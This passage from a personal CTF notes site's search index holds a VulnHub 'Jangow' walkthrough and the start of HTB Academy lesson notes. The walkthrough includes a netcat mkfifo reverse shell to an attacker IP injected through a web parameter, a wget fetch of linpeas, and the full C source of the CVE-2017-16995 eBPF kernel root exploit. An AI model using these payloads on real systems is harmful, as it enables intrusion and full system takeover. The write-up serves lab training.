http://192.168.0.28/site/css/FUZZ\n\n[Status: 200, Size: 948, Words: 61, Lines: 17]                                                                                                                                                                                                                                                                               | URL | http://192.168.0.28/site/css/\n    * FUZZ: [INFO] Starting queued job on target: http://192.168.0.28/site/js/FUZZ\n\n[Status: 200, Size: 949, Words: 64, Lines: 17]                                                                                                                                                                                                                                                                               | URL | http://192.168.0.28/site/js/\n    * FUZZ: [INFO] Starting queued job on target: http://192.168.0.28/site/assets/img/FUZZ\n\n[Status: 200, Size: 1811, Words: 98, Lines: 21]                                                                                                                                                                                                                                                                              | URL | http://192.168.0.28/site/assets/img/\n    * FUZZ: \n\n:: Progress: [53168/53168] :: Job [6/6] :: 6655 req/sec :: Duration: [0:00:06] :: Errors: 24 ::\n</code></pre> <p>We find a wordpress folder with a config.php. It seems like it's the only file in there. No other interesting folders found</p>"},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#website","title":"Website","text":"<p>Looking at the website it seems like a simple  template based on bootstrap. Checking the menu items we stumble upon a php file</p> <p></p> <p>Adding some values to the <code>buscar</code> parameter we discover a low hanging fruit, a RCE (remote code execution)</p> <p></p> <p>We intercept the request with burpsuite and send it to the repeater so we can easily manipulate the values for the buscar parameter.</p> <p></p> <p>In the repeater tab we confirm it still works.</p> <p></p> <p>Now we try a bash reverse shell. We look at PayloadsAllTheThings for a reverse shell. After trying and failing with a bash reverse shell we try the mostly reliable nc reverse shell</p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.14 4242 &gt;/tmp/f\n</code></pre> <p>We add this to the buscar parameter and url-encode it so we get</p> <pre><code>rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+192.168.0.14+2424+&gt;/tmp/f\n</code></pre> <p>We still got nothing but we can see the command tries to connect and after a while it has a time-out. So there has to be some kind of firewall or ids that prevents outgoing connections. We can try random higher ports but it seems like it's blocked. So let's try with some well-known ports every web-server may have open (since it's running and hosting a web-site). We start with port 443 (https) and we get in at the first attempt.</p> <p>On the attacker machine start nc listener on port 443:</p> <pre><code>nc -nlvp 443\n</code></pre> <p>The buscar-parameter value we change the port, add it in burpsuite and hit send</p> <pre><code>rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+192.168.0.14+2424+&gt;/tmp/f\n</code></pre> <p></p> <p>And we have a shell:</p> <p></p> <p>Now we need to stabilize the shell</p> <pre><code>python3 -c \"import pty; pty.spawn('/bin/bash')\"\nCTRL + Z and type in:\nstty raw -echo &amp;&amp; fg\nexport TERM=xterm-256-color\n</code></pre> <p>Now the shell is stable with tab complete</p>"},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#exploitation-research","title":"Exploitation Research","text":"<p><code>sudo -l</code>, setuid search and crontab list don't give as any result. But we see it's a pretty old kernel version. Anyway, we decide to run leanpeas and see what we get</p> <p>We need to download or move linpeas.sh in a folder where we are gonna start a python web server. Since we know that ports are blocked, we use port 443 again , but we have to run this command as root.</p> <p>On the attacker machine:</p> <pre><code>sudo python -m SimpleHTTPServer 443\n</code></pre> <p>On the victim machine we move to a writable folder and download linpeas.sh</p> <pre><code>cd /tmp\nwget 192.168.0.14:443/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh | tee linpeas.txt\n</code></pre> <p>The last tee command is used to be able to watch linpeas work and at the same time write the results to the .txt file.</p> <p>Wee look for yellow/red and red entries</p> <p>One of the first entries is:</p> <pre><code>\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Executing Linux Exploit Suggester 2\n\u255a https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                                                                                                      \n\n  #############################\n    Linux Exploit Suggester 2\n  #############################\n\n  Local Kernel: 4.4.0\n  Searching 72 exploits...\n\n  Possible Exploits\n  [1] af_packet\n      CVE-2016-8655\n      Source: http://www.exploit-db.com/exploits/40871\n  [2] exploit_x\n      CVE-2018-14665\n      Source: http://www.exploit-db.com/exploits/45697\n  [3] get_rekt\n      CVE-2017-16695\n      Source: http://www.exploit-db.com/exploits/45010\n</code></pre>"},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#exploitation","title":"Exploitation","text":""},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#exploit","title":"Exploit","text":"<p>First exploit didn't work for me, second exploit needed x11 so I didn't even try. So let's try the third one.</p> <p>Visit the link and read the comments in the code (how to use it, how to compile and things like that)</p> <p>Open vim and paste the code into vim. I've named the file <code>exploit.c</code></p> <pre><code>/*\n  Credit @bleidl, this is a slight modification to his original POC\n  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c\n\n  For details on how the exploit works, please visit\n  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html\n\n  Tested on Ubuntu 16.04 with the following Kernels\n  4.4.0-31-generic\n  4.4.0-62-generic\n  4.4.0-81-generic\n  4.4.0-116-generic\n  4.8.0-58-generic\n  4.10.0.42-generic\n  4.13.0-21-generic\n\n  Tested on Fedora 27\n  4.13.9-300\n  gcc cve-2017-16995.c -o cve-2017-16995\n  internet@client:~/cve-2017-16995$ ./cve-2017-16995\n  [.]\n  [.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)\n  [.]\n  [.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **\n  [.]\n  [*] creating bpf map\n  [*] sneaking evil bpf past the verifier\n  [*] creating socketpair()\n  [*] attaching bpf backdoor to socket\n  [*] skbuff =&gt; ffff880038c3f500  \n  [*] Leaking sock struct from ffff88003af5e180\n  [*] Sock-&gt;sk_rcvtimeo at offset 472\n  [*] Cred structure at ffff880038704600\n  [*] UID from cred structure: 1000, matches the current: 1000\n  [*] hammering cred structure at ffff880038704600\n  [*] credentials patched, launching shell...\n  #id\n  uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(internet)\n\n*/\n\n#include &lt;errno.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;stdarg.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;linux/bpf.h&gt;\n#include &lt;linux/unistd.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/un.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;sys/personality.h&gt;\n\nchar buffer[64];\nint sockets[2];\nint mapfd, progfd;\nint doredact = 0;\n\n#define LOG_BUF_SIZE 65536\n#define PHYS_OFFSET 0xffff880000000000\nchar bpf_log_buf[LOG_BUF_SIZE];\n\nstatic __u64 ptr_to_u64(void *ptr)\n{\nreturn (__u64) (unsigned long) ptr;\n}\n\nint bpf_prog_load(enum bpf_prog_type prog_type,\nconst struct bpf_insn *insns, int prog_len,\nconst char *license, int kern_version)\n{\nunion bpf_attr attr = {\n.prog_type = prog_type,\n.insns = ptr_to_u64((void *) insns),\n.insn_cnt = prog_len / sizeof(struct bpf_insn),\n.license = ptr_to_u64((void *) license),\n.log_buf = ptr_to_u64(bpf_log_buf),\n.log_size = LOG_BUF_SIZE,\n.log_level = 1,\n};\n\nattr.kern_version = kern_version;\n\nbpf_log_buf[0] = 0;\n\nreturn syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));\n}\n\nint bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,\nint max_entries, int map_flags)\n{\nunion bpf_attr attr = {\n.map_type = map_type,\n.key_size = key_size,\n.value_size = value_size,\n.max_entries = max_entries\n};\n\nreturn syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));\n}\n\nint bpf_update_elem(int fd, void *key, void *value, unsigned long long flags)\n{\nunion bpf_attr attr = {\n.map_fd = fd,\n.key = ptr_to_u64(key),\n.value = ptr_to_u64(value),\n.flags = flags,\n};\n\nreturn syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));\n}\n\nint bpf_lookup_elem(int fd, void *key, void *value)\n{\nunion bpf_attr attr = {\n.map_fd = fd,\n.key = ptr_to_u64(key),\n.value = ptr_to_u64(value),\n};\n\nreturn syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));\n}\n\n#define BPF_ALU64_IMM(OP, DST, IMM)             \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \\\n        .dst_reg = DST,                 \\\n        .src_reg = 0,                   \\\n        .off   = 0,                 \\\n        .imm   = IMM })\n\n#define BPF_MOV64_REG(DST, SRC)                 \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \\\n        .dst_reg = DST,                 \\\n        .src_reg = SRC,                 \\\n        .off   = 0,                 \\\n        .imm   = 0 })\n\n#define BPF_MOV32_REG(DST, SRC)                 \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_ALU | BPF_MOV | BPF_X,     \\\n        .dst_reg = DST,                 \\\n        .src_reg = SRC,                 \\\n        .off   = 0,                 \\\n        .imm   = 0 })\n\n#define BPF_MOV64_IMM(DST, IMM)                 \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \\\n        .dst_reg = DST,                 \\\n        .src_reg = 0,                   \\\n        .off   = 0,                 \\\n        .imm   = IMM })\n\n#define BPF_MOV32_IMM(DST, IMM)                 \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_ALU | BPF_MOV | BPF_K,     \\\n        .dst_reg = DST,                 \\\n        .src_reg = 0,                   \\\n        .off   = 0,                 \\\n        .imm   = IMM })\n\n#define BPF_LD_IMM64(DST, IMM)                  \\\n    BPF_LD_IMM64_RAW(DST, 0, IMM)\n\n#define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_LD | BPF_DW | BPF_IMM,     \\\n        .dst_reg = DST,                 \\\n        .src_reg = SRC,                 \\\n        .off   = 0,                 \\\n        .imm   = (__u32) (IMM) }),          \\\n    ((struct bpf_insn) {                    \\\n        .code  = 0,                     \\\n        .dst_reg = 0,                   \\\n        .src_reg = 0,                   \\\n        .off   = 0,                 \\\n        .imm   = ((__u64) (IMM)) &gt;&gt; 32 })\n\n#ifndef BPF_PSEUDO_MAP_FD\n# define BPF_PSEUDO_MAP_FD  1\n#endif\n\n#define BPF_LD_MAP_FD(DST, MAP_FD)              \\\n    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)\n\n#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \\\n        .dst_reg = DST,                 \\\n        .src_reg = SRC,                 \\\n        .off   = OFF,                   \\\n        .imm   = 0 })\n\n#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \\\n        .dst_reg = DST,                 \\\n        .src_reg = SRC,                 \\\n        .off   = OFF,                   \\\n        .imm   = 0 })\n\n#define BPF_ST_MEM(SIZE, DST, OFF, IMM)             \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \\\n        .dst_reg = DST,                 \\\n        .src_reg = 0,                   \\\n        .off   = OFF,                   \\\n        .imm   = IMM })\n\n#define BPF_JMP_IMM(OP, DST, IMM, OFF)              \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \\\n        .dst_reg = DST,                 \\\n        .src_reg = 0,                   \\\n        .off   = OFF,                   \\\n        .imm   = IMM })\n\n#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \\\n    ((struct bpf_insn) {                    \\\n        .code  = CODE,                  \\\n        .dst_reg = DST,                 \\\n        .src_reg = SRC,                 \\\n        .off   = OFF,                   \\\n        .imm   = IMM })\n\n#define BPF_EXIT_INSN()                     \\\n    ((struct bpf_insn) {                    \\\n        .code  = BPF_JMP | BPF_EXIT,            \\\n        .dst_reg = 0,                   \\\n        .src_reg = 0,                   \\\n        .off   = 0,                 \\\n        .imm   = 0 })\n\n#define BPF_DISABLE_VERIFIER()                                                       \\\n    BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF),             /* r2 = (u32)0xFFFFFFFF   */   \\\n    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2),   /* if (r2 == -1) {        */   \\\n    BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */   \\\n    BPF_EXIT_INSN()                                   /* }                      */   \\\n\n#define BPF_MAP_GET(idx, dst)                                                        \\\n    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \\\n    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \\\n    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \\\n    BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \\\n    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \\\n    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \\\n    BPF_EXIT_INSN(),                                  /*   exit(0);             */   \\\n    BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */              static int load_prog() {\nstruct bpf_insn prog[] = {\nBPF_DISABLE_VERIFIER(),\n\nBPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, -16),   /* *(fp - 16) = r1       */\n\nBPF_LD_MAP_FD(BPF_REG_9, mapfd),\n\nBPF_MAP_GET(0, BPF_REG_6),                         /* r6 = op               */\nBPF_MAP_GET(1, BPF_REG_7),                         /* r7 = address          */\nBPF_MAP_GET(2, BPF_REG_8),                         /* r8 = value            */\n\n/* store map slot address in r2 */\nBPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0               */\nBPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */\n\nBPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 2),             /* if (op == 0)          */\n/* get fp */\nBPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),\nBPF_EXIT_INSN(),\n\nBPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 3),             /* else if (op == 1)     */\n/* get skbuff */\nBPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_10, -16),\nBPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),\nBPF_EXIT_INSN(),\n\nBPF_JMP_IMM(BPF_JNE, BPF_REG_6, 2, 3),             /* else if (op == 2)     */\n/* read */\nBPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0),\nBPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),\nBPF_EXIT_INSN(),\n/* else                  */\n/* write */\nBPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), BPF_EXIT_INSN(),\n\n};\nreturn bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog), \"GPL\", 0);\n}\n\nvoid info(const char *fmt, ...) {\nva_list args;\nva_start(args, fmt);\nfprintf(stdout, \"[.] \");\nvfprintf(stdout, fmt, args);\nva_end(args);\n}\n\nvoid msg(const char *fmt, ...) {\nva_list args;\nva_start(args, fmt);\nfprintf(stdout, \"[*] \");\nvfprintf(stdout, fmt, args);\nva_end(args);\n}\n\nvoid redact(const char *fmt, ...) {\nva_list args;\nva_start(args, fmt);\nif(doredact) {\nfprintf(stdout, \"[!] ( ( R E D A C T E D ) )\\n\");\nreturn;\n}\nfprintf(stdout, \"[*] \");\nvfprintf(stdout, fmt, args);\nva_end(args);\n}\n\nvoid fail(const char *fmt, ...) {\nva_list args;\nva_start(args, fmt);\nfprintf(stdout, \"[!] \");\nvfprintf(stdout, fmt, args);\nva_end(args);\nexit(1);\n}\n\nvoid initialize() {\ninfo(\"\\n\");\ninfo(\"t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)\\n\");\ninfo(\"\\n\");\ninfo(\"  ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **\\n\");\ninfo(\"\\n\");\n\nredact(\"creating bpf map\\n\");\nmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3, 0);\nif (mapfd &lt; 0) {\nfail(\"failed to create bpf map: '%s'\\n\", strerror(errno));\n}\n\nredact(\"sneaking evil bpf past the verifier\\n\");\nprogfd = load_prog();\nif (progfd &lt; 0) {\nif (errno == EACCES) {\nmsg(\"log:\\n%s\", bpf_log_buf);\n}\nfail(\"failed to load prog '%s'\\n\", strerror(errno));\n}\n\nredact(\"creating socketpair()\\n\");\nif(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) {\nfail(\"failed to create socket pair '%s'\\n\", strerror(errno));\n}\n\nredact(\"attaching bpf backdoor to socket\\n\");\nif(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0) {\nfail(\"setsockopt '%s'\\n\", strerror(errno));\n}\n}\n\nstatic void writemsg() {\nssize_t n = write(sockets[0], buffer, sizeof(buffer));\nif (n &lt; 0) {\nperror(\"write\");\nreturn;\n}\nif (n != sizeof(buffer)) {\nfprintf(stderr, \"short write: %zd\\n\", n);\n}\n}\n\nstatic void update_elem(int key, unsigned long value) {\nif (bpf_update_elem(mapfd, &amp;key, &amp;value, 0)) {\nfail(\"bpf_update_elem failed '%s'\\n\", strerror(errno));\n}\n}\n\nstatic unsigned long get_value(int key) {\nunsigned long value;\nif (bpf_lookup_elem(mapfd, &amp;key, &amp;value)) {\nfail(\"bpf_lookup_elem failed '%s'\\n\", strerror(errno));\n}\nreturn value;\n}\n\nstatic unsigned long\nsendcmd(unsigned long op, unsigned long addr, unsigned long value) {\nupdate_elem(0, op);\nupdate_elem(1, addr);\nupdate_elem(2, value);\nwritemsg();\nreturn get_value(2);\n}\n\nunsigned long\nget_skbuff() {\nreturn sendcmd(1, 0, 0);\n}\n\nunsigned long\nget_fp() {\nreturn sendcmd(0, 0, 0);\n}\n\nunsigned long\nread64(unsigned long addr) {\nreturn sendcmd(2, addr, 0);\n}\n\nvoid\nwrite64(unsigned long addr, unsigned long val) {\n(void)sendcmd(3, addr, val);\n}\n\nstatic unsigned long find_cred() {\nuid_t uid = getuid();\nunsigned long skbuff = get_skbuff();\n/*\n     * struct sk_buff {\n     *     [...24 byte offset...]\n     *     struct sock     *sk;\n     * };\n     *\n     */\n\nunsigned long sock_addr = read64(skbuff + 24);\nmsg(\"skbuff =&gt; %llx\\n\", skbuff);\nmsg(\"Leaking sock struct from %llx\\n\", sock_addr);  if(sock_addr &lt; PHYS_OFFSET){\nfail(\"Failed to find Sock address from sk_buff.\\n\");\n}   /*\n     * scan forward for expected sk_rcvtimeo value.\n     *\n     * struct sock {\n     *    [...]\n     *    const struct cred      *sk_peer_cred; \n     *    long                    sk_rcvtimeo;             \n     *  };\n     */\nfor (int i = 0; i &lt; 100; i++, sock_addr += 8) {\nif(read64(sock_addr) == 0x7FFFFFFFFFFFFFFF) {\nunsigned long cred_struct = read64(sock_addr - 8);\nif(cred_struct &lt; PHYS_OFFSET) {\ncontinue;\n}\n\nunsigned long test_uid = (read64(cred_struct + 8) &amp; 0xFFFFFFFF);\n\nif(test_uid != uid) {\ncontinue;\n}\nmsg(\"Sock-&gt;sk_rcvtimeo at offset %d\\n\", i * 8);\nmsg(\"Cred structure at %llx\\n\", cred_struct);\nmsg(\"UID from cred structure: %d, matches the current: %d\\n\", test_uid, uid);\n\nreturn cred_struct;\n}\n}\nfail(\"failed to find sk_rcvtimeo.\\n\");\n}\n\nstatic void\nhammer_cred(unsigned long addr) {\nmsg(\"hammering cred structure at %llx\\n\", addr);\n#define w64(w) { write64(addr, (w)); addr += 8; }\nunsigned long val = read64(addr) &amp; 0xFFFFFFFFUL;\nw64(val); w64(0); w64(0); w64(0); w64(0);\nw64(0xFFFFFFFFFFFFFFFF); w64(0xFFFFFFFFFFFFFFFF); w64(0xFFFFFFFFFFFFFFFF); #undef w64\n}\n\nint\nmain(int argc, char **argv) {\ninitialize();\nhammer_cred(find_cred());\nmsg(\"credentials patched, launching shell...\\n\");\nif(execl(\"/bin/sh\", \"/bin/sh\", NULL)) {c\nfail(\"exec %s\\n\", strerror(errno));\n}\n}\n</code></pre> <p>Compile with:</p> <pre><code>gcc exploit.c -o exploit\n</code></pre> <p>Execute:</p> <pre><code>./exploit\n</code></pre> <p>And you are root</p> <p></p> <p>After that you can go into the root folder and cat the <code>proof.txt</code></p> <pre><code># cd /root\n# ls\nproof.txt\n# cat proof.txt\n                       @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                          \n                       @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    /&amp;@@@@@@@@@@                          \n                       @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((//#&amp;@@@&amp;   .&amp;@@@@@                          \n                       @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   ./@@*   &amp;@@                          \n                       @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;                    \n                       @  @@@, /@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;                    \n                       @  @&amp;  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&amp;                    \n                       @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@                   \n                       @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @                   \n                       @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@                  \n                      @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@                 \n                      @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@                 \n                      @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 \n                       @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  \n                       @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@                  \n                       @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &amp;@                   \n                       @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@                    \n                       @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;                    \n                       @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &amp;@@&amp;&amp;                    \n                       @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#/.      &amp;@@@@&amp;&amp;                    \n                       @  @@@@@@@@&amp;               JANGOW               &amp;@@@                          \n                       @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;                          \n                                     &amp;&amp;&amp;@@@@&amp;%       &amp;/    (&amp;&amp;@@@&amp;&amp;&amp;                                \n                                       (((((((((((((((((((((((((((((\n\n\n\n\n\nhash-is-here\n</code></pre>"},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#possible-rabbit-holes-or-different-attack-vectors","title":"Possible rabbit holes or different attack vectors","text":""},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#dirtycow","title":"DirtyCOW","text":"<p>A dirtyCOW should have been possible since the kernel version on the victim machine is 4.4.0-31 and the earliest fixed version in Ubuntu 16.04 LTS is kernel version 4.4.0-45. Applying the different dirtyCOW resulted in unstable system or reboots. </p>"},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#the-wordpress-folder","title":"The wordpress folder","text":"<p>The wordpress folder was empty except the config.php. In the config.php we can get the mysql credentials. Since I got better attack vectors, I didn't follow this further. We can get the credentials even without an initial shell if we use the RCE that the homepage provides us. For example, we can use <code>find</code> command like <code>find+/var/www/html</code> as the value for the parameter <code>buscar</code> and we'll find the file <code>.backup</code> containing the credentials</p> <p></p>"},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#the-ftp-credentials","title":"The ftp credentials","text":"<p>Reusing the user and password credential we get from <code>config.php</code> or <code>/var/www/html/.backup</code>, we can login to ftp. After getting the initial shell we can use the credentials to <code>su</code> as the user jangow01. Anyway, the initial attack vector is still more promising so we don't follow this vector</p>"},{"location":"ctf-boxes/vulnhub/easy/jangow/jangow/#the-backup-file-in-the-script-folder","title":"The backup file in the /script folder","text":"<p>There is a backup executable in the /script folder but I couldn't use it to escalate privileges. No <code>setuid</code> on the file and nothing with <code>sudo -l</code> or with <code>crontab -l</code></p>"},{"location":"htb-academy/introduction_to_academy/","title":"Introduction to Academy","text":""},{"location":"htb-academy/introduction_to_academy/#introduction","title":"Introduction","text":"<p>HTB Academy's goal is to provide a highly interactive and streamlined  learning process to allow users to have fun while learning. </p> <p>The structure of the Academy is as follows:</p> <pre><code>Path\n  \u251c\u2500\u2500 Module_1\n  \u2502     \u2514\u2500\u2500 Sections\n  \u2502\n  \u251c\u2500\u2500 Module_2\n  \u2502     \u2514\u2500\u2500 Sections\n  \u2502\n  \u251c\u2500\u2500 Module_3\n  \u2502     \u2514\u2500\u2500 Sections\n  \u2502\n  \u2514\u2500\u2500 Module_4\n        \u2514\u2500\u2500 Section\n</code></pre>"},{"location":"htb-academy/introduction_to_academy/#path","title":"Path","text":"<p>A path is a set of modules making up a broader topic. Some paths share modules, especially fundamental topics.</p>"},{"location":"htb-academy/introduction_to_academy/#module","title":"Module","text":"<p>A module has the focus on a specific topic. A topic can be of wider range and specific. They can be standalone or part of a path. Different paths can have the same module. Some modules have a final skill assessment that has to be taken to finish the module.</p> <p>Modules are split in 5 different tiers.</p> <ul> <li>Tier 0 - This modules are free</li> <li>Tier 1 - cost 50 cubes, upon finishing rewards 10 cubes back</li> <li>Tier 2 - cost 100 cubes, upon finishing rewards 20 cubes back</li> <li>Tier 3 - cost 500 cubes, upon finishing rewards 100 cubes back</li> <li>Tier 4 - cost 1000 cubes, upon finishing rewards 200 cubes back</li> </ul> <p>Tier 0,1,2 are included in the student subscription</p> <p>A Module is marked complete once all the sections are marked as completed. This includes the Interactive sections of the module, meaning you need to submit the correct answers.</p>"},{"location":"htb-academy/introduction_to_academy/#section","title":"Section","text":"<p>A module is broken down to sections. They are the smallest learning block. We have to finish all sections to finish the module and eventually finish the path. The sections names make up the Table of Contents on the right side of the web-page</p>"},{"location":"htb-academy/introduction_to_academy/#interactive-sections","title":"Interactive Sections","text":"<p>Interactive sections have a small cube next to them. To finish such sections, you have to answer some questions at the end. The answers are in the section text or can be obtained solving task given to you. Solving interactive sections awards you with cubes. Those cubes can be used as a currency to get other modules. </p>"},{"location":"htb-academy/introduction_to_academy/#interactive-sections-with-targets","title":"Interactive Sections with Targets","text":"<p>Interactive sections can have targets. This targets are used to get the answers and complete the section. There are different types of targets.</p>"},{"location":"htb-academy/introduction_to_academy/#docker-target","title":"Docker Target","text":"<p>Docker targets are spawn pretty quick and are publicly accessible (no VPN needed)</p>"},{"location":"htb-academy/introduction_to_academy/#vm-target","title":"VM Target","text":"<p>VM targets are full operating systems, like Linux or Windows, in a virtual machine. It takes longer to spawn them up and they are only accessible with VPN or HTB's own Pwnbox. </p> <p></p>"},{"location":"htb-academy/javascript_deobfuscation/","title":"JavaScript Deobfuscation","text":""},{"location":"htb-academy/javascript_deobfuscation/#introduction","title":"Introduction","text":"<p>A website usually consist of <code>HTML</code> (structure), <code>CSS</code> (design) and <code>JavaScript</code> (functionality). Since the source of a website is publicly visible, developer use to obfuscate the source. Especially the JavaScript part is a good target to obfuscate and hide the true intentions behind the code.</p> <p>Let's see an example:</p> <pre><code>&lt;/html&gt;\n&lt;!DOCTYPE html&gt;\n\n&lt;head&gt;\n    &lt;title&gt;Secret Serial Generator&lt;/title&gt;\n    &lt;style&gt;\n*,\nhtml {\nmargin: 0;\npadding: 0;\nborder: 0;\n}\n\nhtml {\nwidth: 100%;\nheight: 100%;\n}\n\nbody {\nwidth: 100%;\nheight: 100%;\nposition: relative;\nbackground-color: #6fb3eb;\n}\n\n.center {\nwidth: 100%;\nheight: 50%;\nmargin: 0;\nposition: absolute;\ntop: 50%;\nleft: 50%;\ntransform: translate(-50%, -50%);\ncolor: white;\nfont-family: \"Helvetica\", Helvetica, sans-serif;\ntext-align: center;\n}\n\nh1 {\nfont-size: 144px;\n}\n\np {\nfont-size: 64px;\n}\n&lt;/style&gt;\n    &lt;script src=\"secret.js\"&gt;&lt;/script&gt;\n    &lt;!-- HTB{4lw4y5_r34d_7h3_50urc3} --&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;div class=\"center\"&gt;\n        